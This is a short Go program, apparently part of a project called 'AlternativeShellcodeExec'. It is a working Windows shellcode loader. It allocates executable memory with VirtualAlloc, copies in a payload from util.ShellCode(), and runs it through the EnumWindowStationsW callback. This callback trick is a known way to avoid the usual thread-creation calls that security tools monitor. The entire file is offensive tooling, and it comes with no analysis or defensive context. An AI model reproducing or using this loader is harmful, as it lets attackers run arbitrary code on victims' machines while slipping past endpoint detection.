package main

import (
	"AlternativeShellcodeExec/pkg/util"
	"syscall"
	"unsafe"
)

const (
	MEM_COMMIT             = 0x1000
	PAGE_EXECUTE_READWRITE = 0x40
)

func Run(op []byte) {
	// Allocate memory to store op
	kernel32, _ := syscall.LoadDLL("kernel32.dll")
	virtualAlloc, _ := kernel32.FindProc("VirtualAlloc")
	addr, _, _ := virtualAlloc.Call(0, uintptr(len(op)), MEM_COMMIT, PAGE_EXECUTE_READWRITE)

	// Process op array
	for i := range op {
		*(*byte)(unsafe.Pointer(addr + uintptr(i))) = op[i]
	}

	if addr != 0 {
		// Use EnumWindowStationsW to call the shellcode
		user32, _ := syscall.LoadDLL("user32.dll")
		enumWindowStationsW, _ := user32.FindProc("EnumWindowStationsW")
		ret, _, err := enumWindowStationsW.Call(addr, 0)
		if ret == 0 {
			println("EnumWindowStationsW failed:", err)
			return
		}
	}
}

func main() {
	Run(util.ShellCode())
}
